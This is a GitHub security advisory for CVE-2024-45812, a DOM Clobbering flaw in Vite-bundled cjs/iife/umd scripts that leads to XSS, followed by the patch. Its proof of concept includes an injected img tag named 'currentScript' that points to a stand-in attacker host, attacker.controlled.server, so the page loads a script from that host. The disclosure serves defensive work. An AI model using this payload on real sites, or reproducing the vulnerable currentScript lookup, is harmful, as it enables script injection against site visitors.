# [M] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS

## Summary
Severity: Medium
Advisory: GHSA-64vr-g452-qvp3
CVE: CVE-2024-45812
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2024-09-17
Source: https://github.com/advisories/GHSA-64vr-g452-qvp3
Type: github-advisory

## Affected
- npm: `vite` — affected >=5.4.0 <5.4.6
- npm: `vite` — affected >=5.3.0 <5.3.6
- npm: `vite` — affected >=5.2.0 <5.2.14
- npm: `vite` — affected >=4.0.0 <4.5.4
- npm: `vite` — affected >=0 <3.2.11
- npm: `vite` — affected >=5.0.0 <5.1.8

## Details
### Summary

We discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.

Note that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986

### Details

**Backgrounds**

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

**Gadgets found in Vite**

We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

```
const relativeUrlMechanisms = {
  amd: (relativePath) => {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
```

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. 

```
// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
```

```
// extra.js
export default "https://myserver/justAnOther.js"
```

```
// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
```

After running the build command, the developer will get following bundle as the output.

```
// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document>"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
```

Adding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.


```
<!DOCTYPE html>
<html>
<head>
  <title>Vite Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name="currentScript" src="https://attacker.controlled.server/"></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script type="module" crossorigin src="/assets/index-DDmIg9VD.js"></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.

### Patch

```
// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =>
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`,
  )
```

## References
- https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3
- https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
- https://nvd.nist.gov/vuln/detail/CVE-2024-45812
- https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af
- https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675
- https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd
- https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad
- https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3
- https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e
- https://github.com/vitejs/vite
- https://research.securitum.com/xss-in-amp4email-dom-clobbering
- https://scnps.co/papers/sp23_domclob.pdf
